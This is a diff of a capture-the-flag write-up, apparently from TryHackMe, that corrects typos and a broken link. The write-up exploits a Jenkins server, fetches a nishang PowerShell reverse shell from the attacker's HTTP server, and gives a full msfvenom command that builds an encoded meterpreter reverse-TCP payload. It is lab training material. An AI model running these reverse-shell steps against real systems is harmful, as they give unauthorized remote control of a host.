@@ -23,7 +23,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
 ```
 
-The webserver on port 80 seems static and uninteresting for the moment, so I go ahead and explore the webserver on port 8080 which seems to be running a version of Jensins:
+The webserver on port 80 seems static and uninteresting for the moment, so I go ahead and explore the webserver on port 8080 which seems to be running a version of Jenkins:
 
 ![](2021-03-10-11-18-34.png)
 
@@ -39,7 +39,7 @@ This is most likely going to be our attack vector
 
 ## Exploitation
 
-As the target is running Windows, I will be using a reverse powershell (found [here](hhttps://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1))
+As the target is running Windows, I will be using a reverse powershell found [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 I perform a wget for the powershell script and startup a python http server so the target can download the script from me:
 
@@ -65,11 +65,11 @@ I am then given a reverse powershell:
 
 ![](2021-03-10-11-32-09.png)
 
-I then navigate over to the C:/Users/ and see that there is a user named 'bruce'. On their Desktop holds the user flag.
+I then navigate over to the C:/Users/bruce, on their Desktop holds the user flag.
 
 ## Switching Shells
 
-Following with TryHackMe, I attempt to switch shells over to meterpreter to make priviledge escalation easier. To do this, I generated a meterpreter reverse shell payload using msfvenom:
+Following with TryHackMe, I attempt to switch shells over to meterpreter to make privilege escalation easier. To do this, I generated a meterpreter reverse shell payload using msfvenom:
 
 ``msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.3.207 LPORT=4443 -f exe -o shell.exe``
 
